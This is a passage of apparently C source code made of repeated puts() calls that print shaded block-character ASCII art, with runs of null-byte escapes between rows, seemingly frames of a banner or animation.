░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \x00\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \x00\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \x00\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \x00\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ 